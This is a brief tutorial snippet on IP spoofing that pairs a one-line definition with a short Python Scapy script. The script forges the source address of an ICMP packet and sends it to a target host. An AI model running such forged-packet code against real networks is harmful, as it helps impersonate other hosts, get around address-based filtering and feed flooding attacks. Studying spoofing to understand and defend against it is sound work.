# IP Spoofing Attack

IP Spoofing Attack

IP Spoofing involves forging the source IP address in packets to make it appear as if they come from another IP.

from scapy.all import \*

def ip\_spoof(target\_ip, spoofed\_ip):

ip = IP(src=spoofed\_ip, dst=target\_ip)

icmp = ICMP()

pkt = ip/icmp

send(pkt, verbose=0)

print(f"Sent spoofed ICMP packet to {target\_ip} from {spoofed\_ip}")

if \_\_name\_\_ == "\_\_main\_\_":

ip\_spoof("192.168.1.1", "192.168.1.100")
